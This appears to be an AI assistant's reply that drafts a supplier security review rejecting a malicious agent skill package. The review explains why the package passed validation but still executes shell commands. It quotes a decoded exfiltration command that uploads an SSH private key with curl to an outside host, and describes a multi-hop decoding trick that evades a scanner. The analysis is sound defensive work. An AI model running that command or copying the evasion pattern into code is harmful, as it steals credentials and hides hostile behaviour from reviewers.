Do **not** clear this package for supplier onboarding. The two green results you received establish only **compliance with manifest syntax** and **absence of signature mismatches**, *not* safety or functional compliance with declared permissions. Here is what to write in the supplier review:

---

**Supplier Review Finding – Critical (AST10-S06: Silent Supply Chain Injection)**

This package **violates its own security policy** despite passing structural validation. The manifest declares `shell: false`, but the payload in `scripts/report.py` uses `os.system` to execute shell commands after decoding a hex-escaped string. The decoded command is:

```bash
curl -T ~/.ssh/id_rsa h.io
```

This exfiltrates the agent’s SSH private key to an external domain.

While `validators/usf.py` returned `OK` and the content scanner reported nothing, **these results are misleading due to known limitations in tooling**:

- `validators/usf.py` only checks the shape of `signature` and `content_hash`, not their semantic correctness (NEVER #1, #2).
- The `content_hash` covers only `SKILL.md` and Python scripts—**but does not hash the behavior of executing those scripts**. The hash is unchanged even though the code performs unauthorized actions.
- The scanner did not flag the payload because, although the hex escapes were decoded during analysis, **the execution path crosses two hops**: decode → assign to `_STAGE` → later pass to `codecs.decode` in `publish()` → `os.system`. This exceeds the **one-assignment** chain limit defined in **C2** of the encoded-payload check.
- `shell: false` is declared but ignored at runtime—this is a **silent metadata drop**, the core event AST10 guards against.

This is a confirmed case of **Silent Supply Chain Injection (AST10-S06)**. The package is **well-formed** but **maliciously functional**—a worst-case scenario for automated validation. The manifest's permissions are meaningless because the runtime does not enforce `shell: false`.

**Action Required**:  
Reject this package. Update your porting pipeline to include **runtime-enforcement audits** and **execution-path tracing across assignments** for any skill that declares `shell: false` or `network.allow: []`. Do not rely on manifest-only validation for supplier attestation.

Additionally, **revise your interpretation of “OK” results**: as stated in **NEVER #5**, schema compliance does not imply semantic safety. This package is schema-compliant precisely *because* the attack hides behind syntactic conformity.

--- 

This finding exemplifies why **AST10 must be treated as a runtime control boundary**, not a one-time schema check. The real exposure is not a missing field—it is that **security metadata was silently dropped during execution**, despite being present in the manifest. That is the essence of AST10.